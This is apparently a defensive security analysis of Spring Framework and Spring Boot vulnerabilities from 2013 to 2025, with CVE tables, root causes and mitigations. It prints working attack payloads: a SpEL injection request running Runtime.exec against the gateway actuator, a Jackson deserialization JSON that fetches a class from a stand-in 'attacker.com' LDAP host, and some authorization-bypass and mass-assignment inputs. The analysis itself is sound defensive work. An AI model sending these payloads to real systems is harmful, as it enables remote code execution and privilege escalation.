# Spring Framework Security Analysis: Meta-Structure Extraction from Source Code

> **Analysis Target**: Spring Framework 6.x / Spring Boot 3.x
> **Source Investigation**: [GitHub spring-projects/spring-framework](https://github.com/spring-projects/spring-framework), [Spring Documentation](https://docs.spring.io/)
> **Analysis Date**: 2026-02-08
> **CVE Coverage**: 2013-2025 (28 CVEs verified against official sources)

## Executive Summary

Spring Framework's design philosophy prioritizes **developer productivity and convention-over-configuration**, which creates structural security vulnerabilities when framework conveniences bypass explicit security decisions. This analysis extracts meta-patterns from Spring's source code revealing how auto-binding, expression evaluation, and default configurations create attack surfaces.

**Key Findings**:
1. **Implicit Trust in User Input**: DataBinder auto-binds HTTP parameters without field whitelisting by default
2. **Expression Language as Attack Surface**: SpEL evaluation in 15+ injection points across Spring ecosystem
3. **Convenience-Driven Defaults**: Actuator endpoints, debug modes, permissive configs favor development over security
4. **Pattern Matching Ambiguities**: Security matchers exhibit parsing inconsistencies exploitable for authorization bypass

---

## 1. Mass Assignment via DataBinder

Spring MVC's **DataBinder** automatically binds HTTP request parameters to controller method arguments. By default, `allowedFields` is null, making `isAllowed()` return true for **any field**.

**Source**: [`DataBinder.java`](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)

```java
protected boolean isAllowed(String field) {
    String[] allowed = getAllowedFields();
    String[] disallowed = getDisallowedFields();
    // ObjectUtils.isEmpty(allowed) = true when null → ALL FIELDS ALLOWED
    return ((ObjectUtils.isEmpty(allowed) || PatternMatchUtils.simpleMatch(allowed, field)) &&
            (ObjectUtils.isEmpty(disallowed) || !PatternMatchUtils.simpleMatch(disallowed, field)));
}
```

**Attack**: `POST /users/update` with `id=123&email=attacker@evil.com&isAdmin=true` auto-binds `isAdmin` field → privilege escalation.

**CVE-2022-22968** (CVSS 5.3): `setDisallowedFields("isAdmin")` was case-sensitive, bypassed with `IsAdmin=true`. Fixed by normalizing patterns to lowercase.

**Defense**:
- **DTO pattern** (recommended): Separate classes with only bindable fields
- **Field whitelisting**: `binder.setAllowedFields("email", "password")`
- **Declarative binding** (Spring 6.1+): `binder.setDeclarativeBinding(true)` — only constructor params + allowedFields

---

## 2. Spring Expression Language (SpEL) Injection

SpEL enables dynamic expression evaluation powering `@Value`, `@PreAuthorize`, `@Query`, and Cloud Gateway routes. When user-controlled data reaches SpEL evaluation, it becomes **RCE**.

**Capabilities**: Method invocation (`T(java.lang.Runtime).getRuntime().exec('cmd')`), property access, constructor calls.

### Critical CVEs

| CVE | Component | CVSS | Attack Vector |
|-----|-----------|------|---------------|
| **CVE-2022-22947** | Spring Cloud Gateway | 10.0 | SpEL in route definitions via exposed `/actuator/gateway/routes` |
| **CVE-2022-22963** | Spring Cloud Function | 9.8 | SpEL via `spring.cloud.function.routing-expression` header |
| **CVE-2022-22980** | Spring Data MongoDB | 8.1 | SpEL in `@Query`/`@Aggregation` with unsanitized parameters |
| **CVE-2025-41253** | Spring Cloud Gateway | 7.5 | SpEL to leak env variables via gateway actuator |

**CVE-2022-22947 Example** — inject SpEL into route filter via exposed actuator:
```http
POST /actuator/gateway/routes/hackroute HTTP/1.1
{"id":"hackroute","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{T(java.lang.Runtime).getRuntime().exec('whoami')}"}}],"uri":"http://example.com"}
```
Then `POST /actuator/gateway/refresh` triggers execution. Actively exploited for crypto mining ([Akamai](https://www.akamai.com/blog/security/spring-cloud-function)).

**Defense**:
1. **Never use user input in SpEL** — use parameterized expressions with `#input` variables
2. **Use `SimpleEvaluationContext`** — no Type references, constructors, or bean refs
3. **Use named parameters in queries**: `:name` not `:#{#name}`
4. **Disable gateway actuator**: `management.endpoints.web.exposure.exclude: gateway`

---

## 3. Insecure Defaults and Actuator Exploitation

Spring Boot auto-configuration prioritizes "getting started quickly". When developers set `management.endpoints.web.exposure.include: "*"`, sensitive endpoints are exposed:

| Endpoint | Risk | Impact |
|----------|------|--------|
| `/env` | Credential theft | DB passwords, API keys |
| `/heapdump` | Memory dump | Passwords, session tokens |
| `/configprops` | Architecture leak | Internal config, secrets |
| `/gateway/routes` | SpEL injection | RCE (CVE-2022-22947) |
| `/jolokia` | JMX-over-HTTP | Application shutdown, arbitrary MBean invocation |

### Actuator → RCE Chain (H2 + HikariCP)

**Prerequisites**: `/env` + `/refresh` exposed, H2 in classpath, HikariCP (Spring Boot 2.x default).

**Attack** ([Spaceraccoon](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)):
1. Inject malicious SQL via `/actuator/env`: set `spring.datasource.hikari.connection-test-query` to H2 `CREATE ALIAS` with `Runtime.exec()`
2. Trigger reload via `/actuator/restart` or `/actuator/refresh`
3. HikariCP executes the connection-test-query → RCE

> "1 in 4 environments with publicly exposed Actuators had misconfigurations leading to credential leakage or RCE" — [Wiz Research](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)

### DevTools and Error Disclosure

- **DevTools in production**: Remote code reload, detailed error pages, auto-restart DoS
- **Error overrides**: `server.error.include-stacktrace: always` leaks SQL queries, file paths, library versions

**Defense**:
```yaml
# Minimal exposure
management.endpoints.web.exposure.include: health,info
management.endpoint.env.enabled: false
management.endpoint.env.post.enabled: false
spring.devtools.restart.enabled: false
```
Require authentication for all actuator endpoints; scope H2 to `test` only.

---

## 4. Authorization Bypass via Pattern Matching

Spring Security's three request matchers have different parsing semantics:

| Matcher | URI Handling | Vulnerability |
|---------|-------------|---------------|
| `RegexRequestMatcher` | **Raw** (non-normalized) | CVE-2022-22978 |
| `AntPathRequestMatcher` | Normalized | Generally safe |
| `MvcRequestMatcher` | MVC-aware | Recommended |

### CVE-2022-22978 (CVSS 9.8): RegexRequestMatcher Bypass

`RegexRequestMatcher` matches against raw request URI. Attackers bypass with URL encoding:
- `GET /admin%2F` → Regex `/admin/.*` doesn't match → `anyRequest().permitAll()` applies → Spring MVC decodes to `/admin/` and routes normally
- Also exploitable via newline injection (`%0A`) and double encoding (`%252F`)

**Affected**: Spring Security 5.4.x-5.6.x. **Fix**: Upgrade to 5.5.7, 5.6.4, or 5.7.0+.

**Secure alternative**: Always use `MvcRequestMatcher` or `AntPathRequestMatcher`.

---

## 5. Spring4Shell (CVE-2022-22965, CVSS 9.8)

**RCE** affecting Spring MVC on **JDK 9+** deployed as WAR on Tomcat. Analyzed in [BlackHat EU-22: Databinding2Shell](https://i.blackhat.com/EU-22/Wednesday-Briefings/EU-22-Mu-Databinding2Shell-Novel-Pathways-to-RCE-Web-Frameworks.pdf).

**Root Cause**: Java 9 introduced `getModule()`, providing alternative path to ClassLoader:
```
class.module.classLoader.resources.context.parent.pipeline.first  // Bypasses "class.classLoader" blacklist
```

**Exploitation Chain**: DataBinder traverses object graph to Tomcat's `AccessLogValve` → manipulates `pattern`/`suffix`/`directory`/`prefix` properties → writes JSP webshell to `webapps/ROOT/shell.jsp` → RCE.

**Requirements**: Spring MVC, JDK 9+, WAR on Tomcat, DataBinder-enabled endpoint. JAR deployments NOT vulnerable.

**Timeline**: PoC leaked March 29, 2022 → Patch March 31 → Active exploitation for crypto mining and Mirai botnet ([Trend Micro](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html)).

**Defense**: Upgrade to Spring 5.3.18/5.2.20+; use DTO pattern; prefer JAR deployment (Spring Boot default).

---

## 6. Jackson Polymorphic Deserialization

Jackson's polymorphic type handling (30+ CVEs since 2017) allows JSON to specify Java class via `@class` field. With global default typing enabled and gadget class in classpath → RCE.

**Key CVEs**: CVE-2017-7525 (9.8), CVE-2019-14379 (9.8), CVE-2019-14439 (9.8), 20+ gadget bypass CVEs in 2020.

**Attack example** (JdbcRowSetImpl JNDI injection):
```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
```
`setAutoCommit(true)` → JNDI lookup → LDAP returns malicious class → RCE.

**Defense**:
- **Never enable global default typing**: `mapper.enableDefaultTyping()` is dangerous
- **Use allow-list typing** (Jackson 2.10+): Custom `BasicPolymorphicTypeValidator` restricting to `com.example.domain.*`
- **Use `@JsonSubTypes`** with explicit type mappings

---

## 7. XXE Injection in Spring XML Parsers

Java XML parsers enable external entity resolution by default. Multiple Spring CVEs:

| CVE | Component | Year |
|-----|-----------|------|
| CVE-2013-4152 | Spring OXM (JAXB) | 2013 |
| CVE-2013-7315 | Spring MVC (StAX) | 2013 |
| CVE-2014-0225 | Spring MVC (DTD) | 2014 |
| CVE-2019-3772 | Spring Integration | 2019 |
| CVE-2019-3773 | Spring Web Services | 2019 |

**Defense**: Disable DTD processing and external entities:
```java
XMLInputFactory factory = XMLInputFactory.newFactory();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```
Spring Boot 2.x+ configures secure XML parsing by default.

---

## 8. Spring Data: Sort Injection and Projection Risks

**CVE-2016-6652** (CVSS 7.5): `Sort.by(userInput)` directly interpolated into ORDER BY clause → SQL injection. Fixed in Spring Data JPA 1.10.4+.

**Defense**: Allowlist-based validation of sort fields, or use predefined `enum SortOption` values.

**Projection SpEL risk**: Interface projections with `@Value("#{target.password}")` execute SpEL. Use DTO classes instead.

---

## 9. 2024-2025 CVE Updates

### Path Traversal (2024)
- **CVE-2024-38816** (7.5): Static resource path traversal in Spring Framework
- **CVE-2024-38819** (7.5): Path traversal in functional web frameworks

### Authorization & Locale Bypasses (2024)
- **CVE-2024-38821**: WebFlux static resource authorization bypass
- **CVE-2024-38827**, **CVE-2024-38829**: Locale-sensitive string comparison bypasses (Turkish locale: `"ADMIN".toLowerCase()` → `"admın"` ≠ `"admin"`)
  - **Fix**: Always use `Locale.ROOT` for security-sensitive comparisons

### Annotation Detection Failures (2025)
- **CVE-2025-41248** (Spring Security), **CVE-2025-41249** (Spring Framework): `@PreAuthorize`, `@Valid`, `@Transactional` annotations not detected on methods with parameterized/generic types due to type erasure
  - **Workaround**: Explicitly re-declare annotations on concrete class overrides

### Other 2024 CVEs
- **CVE-2024-38807** (6.3): Nested JAR signature validation bypass in spring-boot-loader
- **CVE-2024-38828**: DoS via `@RequestBody byte[]` large payload — use `InputStream` instead
- **CVE-2024-38820**: Insecure remoting deserialization — avoid deprecated Spring HTTP Invoker/RMI
- **CVE-2024-22233** (7.5): DoS via malformed requests

---

## Comprehensive CVE Table

| CVE | Year | CVSS | Type | Component |
|-----|------|------|------|-----------|
| CVE-2025-41253 | 2025 | 7.5 | SpEL Info Disclosure | Cloud Gateway |
| CVE-2025-41249 | 2025 | Med | Annotation Detection | Framework |
| CVE-2025-41248 | 2025 | Med | Annotation Detection | Security |
| CVE-2025-41242 | 2025 | High | Path Traversal | MVC |
| CVE-2024-38829 | 2024 | Med | Locale String Handling | LDAP |
| CVE-2024-38828 | 2024 | Med | DoS (byte[] payload) | Framework |
| CVE-2024-38827 | 2024 | High | Locale Auth Bypass | Security |
| CVE-2024-38821 | 2024 | High | WebFlux Auth Bypass | Security |
| CVE-2024-38820 | 2024 | High | Deserialization | Framework |
| CVE-2024-38819 | 2024 | 7.5 | Path Traversal | WebFlux |
| CVE-2024-38816 | 2024 | 7.5 | Path Traversal | Framework |
| CVE-2024-38807 | 2024 | 6.3 | Signature Forgery | Boot Loader |
| CVE-2024-22233 | 2024 | 7.5 | DoS | Framework |
| CVE-2023-34034 | 2023 | High | Auth Bypass | WebFlux |
| CVE-2022-22980 | 2022 | 8.1 | SpEL Injection | Data MongoDB |
| CVE-2022-22978 | 2022 | 9.8 | Auth Bypass (Regex) | Security |
| CVE-2022-22968 | 2022 | 5.3 | Mass Assignment Bypass | Framework |
| CVE-2022-22965 | 2022 | 9.8 | RCE (Spring4Shell) | Framework |
| CVE-2022-22963 | 2022 | 9.8 | SpEL RCE | Cloud Function |
| CVE-2022-22947 | 2022 | 10.0 | SpEL RCE via Actuator | Cloud Gateway |
| CVE-2019-3773 | 2019 | 8.1 | XXE | Web Services |
| CVE-2019-3772 | 2019 | 8.1 | XXE | Integration |
| CVE-2019-14439 | 2019 | 9.8 | Deser. RCE | Jackson |
| CVE-2019-14379 | 2019 | 9.8 | Deser. RCE | Jackson |
| CVE-2017-7525 | 2017 | 9.8 | Deser. RCE | Jackson |
| CVE-2016-6652 | 2016 | 7.5 | SQL Injection | Data JPA |
| CVE-2014-0225 | 2014 | 8.1 | XXE | MVC |
| CVE-2013-7315 | 2013 | 8.1 | XXE | MVC |
| CVE-2013-4152 | 2013 | 8.1 | XXE | OXM |

---

## Meta-Pattern Summary

| # | Meta-Pattern | Security Implication | Representative CVE |
|---|-------------|---------------------|-------------------|
| 1 | **Convenience over Safety** | Auto-binding without whitelisting | CVE-2022-22968 |
| 2 | **Expression Language Ubiquity** | 15+ SpEL injection points | CVE-2022-22947/22963 |
| 3 | **Defaults for Development** | Actuators/debug exposed in prod | CVE-2025-41253 |
| 4 | **Implicit Trust Boundaries** | HTTP params assumed safe | Mass Assignment |
| 5 | **Parser Differential** | Security vs. routing layer mismatch | CVE-2022-22978 |
| 6 | **Abstraction Opacity** | Magic annotations hide SpEL eval | All SpEL CVEs |
| 7 | **Configuration Complexity** | 1000+ `spring.*` properties | Actuator RCE chains |
| 8 | **Opt-In Security** | Insecure by default, secure by exception | Mass Assignment |
| 9 | **Backward Compatibility Tax** | Legacy features remain enabled | CVE-2022-22965 |
| 10 | **Framework Lock-In** | Unannotated methods = unsecured | Method security gaps |

**High-Risk Combinations**:
1. Actuator Exposed + SpEL Injection = RCE (CVE-2022-22947)
2. Mass Assignment + Sensitive Fields = Privilege Escalation
3. RegexRequestMatcher + URL Encoding = Auth Bypass (CVE-2022-22978)
4. @Query + User Input = SpEL RCE (CVE-2022-22980)

**2025 Trends**: Shift from injection vulnerabilities to **authorization logic bypasses** — parser differentials, annotation detection failures, locale-sensitive comparisons.

---

## Version Timeline

| Version | Key Security Change | Breaking |
|---------|-------------------|----------|
| Spring Framework 6.1 (2023-11) | Declarative binding mode | No |
| Spring Framework 6.0 (2022-11) | Jakarta EE 9+ (javax → jakarta) | **Yes** |
| Spring Security 6.0 (2022-11) | `authorizeHttpRequests` replaces `authorizeRequests` | Recommended |
| Spring Boot 3.0 (2022-11) | Java 17 baseline, Jakarta EE 9+ | **Yes** |

**Recommendation**: Migrate to Spring Boot 3.x / Spring Framework 6.x. Spring Boot 2.x enters maintenance mode in 2025.

---

## References

### Official
- [Spring Security Advisories](https://spring.io/security/)
- [Spring Boot Actuator Docs](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
- [Method Security (SpEL)](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)

### Source Code
- [DataBinder.java](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)
- [SpelExpressionParser.java](https://github.com/spring-projects/spring-framework/blob/main/spring-expression/src/main/java/org/springframework/expression/spel/standard/SpelExpressionParser.java)
- [RegexRequestMatcher.java](https://github.com/spring-projects/spring-security/blob/main/web/src/main/java/org/springframework/security/web/util/matcher/RegexRequestMatcher.java)

### Security Research
- [BlackHat EU-22: Databinding2Shell](https://i.blackhat.com/EU-22/Wednesday-Briefings/EU-22-Mu-Databinding2Shell-Novel-Pathways-to-RCE-Web-Frameworks.pdf)
- [Spaceraccoon: RCE via Actuators and H2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)
- [Wiz: Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [ZeroPath: CVE-2025-41253](https://zeropath.com/blog/cve-2025-41253-spring-cloud-gateway-spel-exposure)
- [Spring4Shell: Unit42](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/), [Trend Micro](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html)
- [Jackson Polymorphic Deserialization CVE Criteria](https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria)

### Tools
- [Spring Boot Actuator Exploit](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
- [Spring Boot Vulnerability Collection](https://github.com/LandGrey/SpringBootVulExploit)
- [ysoserial](https://github.com/frohoff/ysoserial)
